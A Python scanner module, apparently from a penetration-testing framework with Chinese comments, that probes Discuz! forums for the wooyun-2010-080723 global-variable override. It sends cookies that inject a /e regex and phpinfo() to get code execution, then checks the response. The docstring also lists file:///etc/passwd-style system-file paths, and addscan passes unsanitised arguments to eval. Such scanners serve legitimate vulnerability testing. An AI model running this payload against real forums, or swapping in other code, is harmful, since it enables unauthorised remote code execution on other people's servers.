#!/usr/bin/env python3
# -*- coding:utf-8 -*-

'''
Discuz!论坛(BBS)是一个采用PHP和MySQL等其他多种数据库构建的性能优异、功能全面、安全稳定的社区论坛平台: https://discuz.dismall.com
    Discuz扫描类: 
        1. Discuz 全局变量防御绕过导致代码执行
            wooyun-2010-080723
                Payload: https://vulhub.org/#/environments/discuz/wooyun-2010-080723/

file:///etc/passwd
file:///C:\Windows\System32\drivers\etc\hosts
'''

from lib.api.dns import dns
from lib.initial.config import config
from lib.tool.md5 import md5, random_md5
from lib.tool.logger import logger
from lib.tool.thread import thread
from lib.tool import check
from lib.tool import head
from thirdparty import requests
from time import sleep

class Discuz():                                                     # todo 1: 类名(例如 ThinkPHP)
    ''' 标有数字的地方都需要自己填写 '''
    def __init__(self):
        self.timeout = config.get('timeout')
        self.headers = config.get('headers')
        self.proxies = config.get('proxies')

        self.app_name = 'Discuz'                                   # todo 2: 漏洞框架/应用程序/CMS等(例如 thinkphp)
        self.md = md5(self.app_name)
        self.cmd = 'echo ' + self.md

        self.wooyun_2010_080723_payloads = [                        # todo 3: Payload的名称(例如 cnvd_2018_24942_payloads)
            {
                'path': 'viewthread.php?tid=10&extra=page%3D1',     # todo 4: url路径(例如/admin/login)
                'data': '',                                         # todo 5: POST数据, 没有的话可以不写
                'headers': head.merge(self.headers, {
                    'Cookie': 'GLOBALS[_DCACHE][smilies][searcharray]=/.*/eui; GLOBALS[_DCACHE][smilies][replacearray]=phpinfo();'
                })
                                                                    # todo 6: Headers请求头, 填在{}里面, 字典形式; 没有的话可以不写, 不写的话将使用默认请求头; 如果存在同名的请求头, 则会覆盖掉原来的
            },
            {
                'path': '?tid=10&extra=page%3D1',
                'data': '',
                'headers': head.merge(self.headers, {
                    'Cookie': 'GLOBALS[_DCACHE][smilies][searcharray]=/.*/eui; GLOBALS[_DCACHE][smilies][replacearray]=phpinfo();'
                })
            },
            {
                'path': '',
                'data': '',
                'headers': head.merge(self.headers, {
                    'Cookie': 'GLOBALS[_DCACHE][smilies][searcharray]=/.*/eui; GLOBALS[_DCACHE][smilies][replacearray]=phpinfo();'
                })
            },
        ]

    def wooyun_2010_080723_scan(self, url):                 # todo 7: POC的名称(例如 cnvd_2018_24942_scan)
        ''' 
            由于php5.3.x版本里php.ini的设置里request_order默认值为GP,
            导致$_REQUEST中不再包含$_COOKIE, 
            我们通过在Cookie中传入$GLOBALS来覆盖全局变量, 可以造成代码执行漏洞。
        '''
        vul_info = {}
        vul_info['app_name'] = self.app_name
        vul_info['vul_type'] = 'RCE'                        # todo 8: 漏洞类型(例如 RCE)
        vul_info['vul_id'] = 'wooyun-2010-080723'           # todo 9: 漏洞编号(例如 CNVD-2018-24942)
        vul_info['vul_method'] = 'GET'                      # todo 10: 请求方式(例如 GET)

        for payload in self.wooyun_2010_080723_payloads:    # todo 3: 同上, Payload的名称
            path = payload['path']
            data = payload['data']
            headers = payload['headers']
            target = url + path

            vul_info['path'] = path
            vul_info['data'] = data
            vul_info['headers'] = headers
            vul_info['target'] = target

            try:
                res = requests.get(                         # todo 11: 请求方式(例如 get)
                    target, 
                    timeout=self.timeout, 
                    headers=headers,
                    data=data, 
                    proxies=self.proxies, 
                    verify=False,
                    allow_redirects=False
                )

                logger.logging(vul_info, res.status_code, res)                    # * LOG
            except requests.ConnectTimeout:
                logger.logging(vul_info, 'Timeout')
                return None
            except requests.ConnectionError:
                logger.logging(vul_info, 'Faild')
                return None
            except:
                logger.logging(vul_info, 'Error')
                return None

            if (('PHP Version' in res.text) and ('PHP License' in res.text)):           # todo 12: 判断扫描结果
                results = {
                    'Target': target,
                    'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                    'Request': res
                }
                return results

    def addscan(self, url, vuln=None):
        if vuln:
            return eval('thread(target=self.{}_scan, url="{}")'.format(vuln, url))

        return [
            thread(target=self.wooyun_2010_080723_scan, url=url)          # todo 6: 同上, POC的名称
        ]

discuz = Discuz()                                                         # todo 1: 同上, 类名
